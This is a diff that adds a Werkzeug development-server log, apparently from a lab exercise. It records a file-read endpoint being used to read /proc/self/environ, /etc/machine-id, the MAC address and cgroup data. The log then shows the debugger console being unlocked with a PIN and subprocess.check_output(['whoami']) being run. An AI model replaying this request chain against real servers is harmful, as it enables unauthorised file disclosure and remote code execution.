@@ -1,0 +1,32 @@
+INFO:werkzeug:[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.1.183:5000
+INFO:werkzeug:[33mPress CTRL+C to quit[0m
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 880-163-023
+INFO:werkzeug:192.168.1.227 - - [20/Oct/2023 11:20:15] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:192.168.1.227 - - [20/Oct/2023 11:20:15] "GET /static/images/coffeeshop.jpg HTTP/1.1" 200 -
+INFO:werkzeug:192.168.1.227 - - [20/Oct/2023 11:20:15] "GET /static/images/coffeehouse2.jpg HTTP/1.1" 200 -
+INFO:werkzeug:192.168.1.227 - - [20/Oct/2023 11:20:15] "GET /static/images/map.jpg HTTP/1.1" 200 -
+INFO:werkzeug:192.168.1.227 - - [20/Oct/2023 11:20:15] "GET /static/images/coffeehouse.jpg HTTP/1.1" 200 -
+INFO:werkzeug:192.168.1.227 - - [20/Oct/2023 11:20:15] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:192.168.1.227 - - [20/Oct/2023 11:20:37] "GET /api?filename=static/images/coffeeshop.jpg HTTP/1.1" 200 -
+INFO:werkzeug:192.168.1.227 - - [20/Oct/2023 11:21:51] "GET /api?filename=/proc/self/environ HTTP/1.1" 200 -
+INFO:werkzeug:192.168.1.227 - - [20/Oct/2023 11:22:29] "[35m[1mGET /api HTTP/1.1[0m" 500 -
+INFO:werkzeug:192.168.1.227 - - [20/Oct/2023 11:22:59] "GET /api?filename=/proc/net/arp HTTP/1.1" 200 -
+INFO:werkzeug:192.168.1.227 - - [20/Oct/2023 11:23:18] "GET /api?filename=/sys/class/net/eth0/address HTTP/1.1" 200 -
+INFO:werkzeug:192.168.1.227 - - [20/Oct/2023 11:24:14] "GET /api?filename=/etc/machine-id HTTP/1.1" 200 -
+INFO:werkzeug:192.168.1.227 - - [20/Oct/2023 11:24:31] "GET /api?filename=/proc/self/cgroup HTTP/1.1" 200 -
+INFO:werkzeug:192.168.1.227 - - [20/Oct/2023 11:25:02] "GET /api?filename=/proc/self/environ HTTP/1.1" 200 -
+INFO:werkzeug:192.168.1.227 - - [20/Oct/2023 11:25:07] "GET /console HTTP/1.1" 200 -
+INFO:werkzeug:192.168.1.227 - - [20/Oct/2023 11:25:07] "GET /console?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:192.168.1.227 - - [20/Oct/2023 11:25:07] "GET /console?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug: * To enable the debugger you need to enter the security pin:
+INFO:werkzeug: * Debugger pin code: 880-163-023
+INFO:werkzeug:192.168.1.227 - - [20/Oct/2023 11:25:07] "GET /console?__debugger__=yes&cmd=printpin&s=CvokZoT2hAwJh0pLGKhC HTTP/1.1" 200 -
+INFO:werkzeug:192.168.1.227 - - [20/Oct/2023 11:25:07] "GET /console?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:192.168.1.227 - - [20/Oct/2023 11:25:11] "GET /console?__debugger__=yes&cmd=pinauth&pin=880-163-023&s=CvokZoT2hAwJh0pLGKhC HTTP/1.1" 200 -
+INFO:werkzeug:192.168.1.227 - - [20/Oct/2023 11:26:20] "GET /console?&__debugger__=yes&cmd=import%20subprocess&frm=0&s=CvokZoT2hAwJh0pLGKhC HTTP/1.1" 200 -
+INFO:werkzeug:192.168.1.227 - - [20/Oct/2023 11:26:35] "GET /console?&__debugger__=yes&cmd=subprocess.check_output(%5B'whoami'%5D)&frm=0&s=CvokZoT2hAwJh0pLGKhC HTTP/1.1" 200 -
